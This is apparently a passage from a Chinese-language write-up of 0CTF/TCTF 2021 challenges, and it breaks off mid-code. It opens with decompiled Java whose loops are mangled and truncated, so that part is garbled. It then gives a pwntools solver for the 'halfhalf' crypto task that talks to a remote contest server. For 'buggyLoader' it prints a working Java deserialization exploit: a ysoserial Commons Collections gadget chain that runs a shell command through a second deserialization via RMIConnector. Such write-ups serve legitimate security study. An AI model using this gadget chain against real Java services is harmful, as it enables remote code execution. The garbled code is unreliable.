                int[] b = new int[20];
                for (int i = 1; i > 31) >>> 24) & -256))); /* 1908, 591 */
                    int id1891 = (b[5] | b[7]) ^ wtf20;
                    int id1888 = id1891 + b[10] + b[11]; int id1883 = id1888 - ((((id1888 >> 31) >>> 24) + id1888) & -256);
                    int temp1872 = a[0] ^ id1883;
                    for (int j = 0; j > 31) >>> 24)) & -256);
                int id1891 = (a[5] | a[7]) ^ wtf20;
                int id1888 = id1891 + a[10] + a[11];
                int id1883 = id1888 - ((((id1888 >> 31) >>> 24) + id1888) & -256);
                for (int j = 13; j >= 0; j--) {
                    a[j + 1] = a[j];
                }
                a[0] = id1883 ^ id1872;
            }
            for (int i = 0; i > 31) >>> 24) & -256 其实是 sign ，thanks to liangjs)
###  halfhalf
逆向部分：
PoW部分验证输入的前四字节的的sha256的后3字节与输出的内容相同。
Magic Word部分将输入直接与常量比对，直接提取出来即可,为`🐶🍐🍳🏠🐣💀💺👈👉🏁🦅🔥🪓👃🎶📄`。
程序先初始化了质数p和q,和一个上限`1=v40 `c=(rand()**2)*9*2` 否则`c= (rand()**2)*9`，然后输出`pow(c,65537,p*q)`
  3. 输出旧的v40，然后重新随机生成一个v40
  4. 若输入的是v40则输出flag 否则退出程序
  5. 退出
crypto部分：
由于*9和*9*2最大的区别是是否为平方数，那么在pow下，我们计算一个雅可比符号就可以判断他和v40的大小，从而二分法逼近
    import hashlib,itertools,string
    from pwn import *
    from sympy import *
    import gmpy2
    #context.log_level="debug"
    #io=process("./debug")
    io=remote("121.5.253.92",34567)
    # pass pow
    def pass_pow():
        io.recvuntil(" ")
    io.writeline("1")
    io.recvuntil("🔒:")
    oo=str(io.readline().strip(),encoding="utf8")
    n=convert_emoji_to_number(oo)
    # get v40 and reset
    io.recvuntil("> ")
    io.writeline("3")
    oo=str(io.readline().strip(),encoding="utf8")
    v40=convert_emoji_to_number(oo)
    print("v40:",v40)
    print("##")
    # io func
    def convert_number_to_emoji(number):
        d="🍐🍳🎶🏁🏠🐣🐶👃👈👉💀💺📄🔥🦅🪓"
        result=""
        tmp=number
        while tmp!=0:
            result=d[tmp%16]+result
            tmp=(tmp>>4)
        return result
    def put_up(v40):
        io.recvuntil("> ")
        io.writeline("2")
        io.recvuntil("❔:")
        io.writeline(convert_number_to_emoji(v40))
        checkstr=str(io.readline().strip(),encoding="utf8")
        check_c=convert_emoji_to_number(checkstr)
        #print(v40,convert_number_to_emoji(v40))
        #print(check_c)
        #print(gmpy2.jacobi(check_c,n))
        return gmpy2.jacobi(check_c,n)
    up=13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084095
    down=13
    while up-down>1:
        newp=up-((up-down)//2)
        print(newp)
        if put_up(newp)==1:
            up=newp
        else:
            down=newp
    print(up)
    print(down)
    # get v40 and reset
    '''
    io.recvuntil("> ")
    io.writeline("3")
    oo=str(io.readline().strip(),encoding="utf8")
    v40=convert_emoji_to_number(oo)
    print("v40:",v40)
    print("##")'''
    # get flag
    io.recvuntil("> ")
    io.writeline("4")
    io.recvuntil("🔑: ")
    io.writeline(convert_number_to_emoji(up))
    io.interactive()
## WEB
###  buggyLoader
题目需要结合二次反序列化get flag，同时序列化的数据需要满足`IndexController`类中的限制：
    String name = objectInputStream.readUTF();
    int year = objectInputStream.readInt();
    if (name.equals("0CTF/TCTF") && year == 2021) {
        objectInputStream.readObject();
    }
这里通过`writeUTF`和`writeInt`先分别写入`0CTF/TCTF`和`2021`，然后再`writeObject`：
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    ObjectOutputStream oss = null;
    oss = new ObjectOutputStream(bos);
    oss.writeUTF("0CTF/TCTF");
    oss.writeInt(2021);
    oss.writeObject(obj);
    oss.flush();
    byte[] bytes = bos.toByteArray();
    bos.close();
    String hex = Utils.bytesTohexString(bytes);
序列化数据的构造：首先是`MyObjectInputStream`中`resolveClass`影响了链子的构造，最后是`cc4`的链调到`RMIConnector`的`connect`触发二次反序列化。  
生成序列化数据：
    package com.yxxx.buggyLoader;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import ysoserial.payloads.CommonsCollections4;
    import ysoserial.payloads.util.Reflections;
    import javax.management.remote.JMXServiceURL;
    import javax.management.remote.rmi.RMIConnector;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.Base64;
    import java.util.HashMap;
    import java.util.HashSet;
    import java.util.Map;
    public class Exp {
        public static void main(String[] args) throws Exception {
            Object obj = getObject();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oss = null;
            oss = new ObjectOutputStream(bos);
            oss.writeUTF("0CTF/TCTF");
            oss.writeInt(2021);
            oss.writeObject(obj);
            oss.flush();
            byte[] bytes = bos.toByteArray();
            bos.close();
            String hex = Utils.bytesTohexString(bytes);
            System.out.println(hex);
            byte[] b2 = Utils.hexStringToBytes(hex);
            InputStream inputStream1 = new ByteArrayInputStream(b2);
            ObjectInputStream objectInputStream1 = new MyObjectInputStream(inputStream1);
            Object obj2 = objectInputStream1.readObject();
        }
        public static Serializable getObject() throws Exception {
            Transformer transformer = InvokerTransformer.getInstance("connect");
            CommonsCollections4 commonsCollections3 = new CommonsCollections4();
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(commonsCollections3.getObject("touch /tmp/success"));
            String expbase64 = new String(Base64.getEncoder().encode(outputStream.toByteArray()));
            String finalExp = "service:jmx:rmi:///stub/" + expbase64;
            RMIConnector rmiConnector = new RMIConnector(new JMXServiceURL(finalExp), new HashMap<>());
            Map innerMap = new HashMap();
            Map lazyMap = LazyMap.decorate(innerMap, transformer);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, rmiConnector);
            HashSet map = new HashSet(1);
            map.add("foo");
            Field f = null;
            try {
                f = HashSet.class.getDeclaredField("map");
            } catch (NoSuchFieldException var18) {
                f = HashSet.class.getDeclaredField("backingMap");
            }
            Reflections.setAccessible(f);
            HashMap innimpl = (HashMap) f.get(map);
            Field f2 = null;
            try {
                f2 = HashMap.class.getDeclaredField("table");
            } catch (NoSuchFieldException var17) {
                f2 = HashMap.class.getDeclaredField("elementData");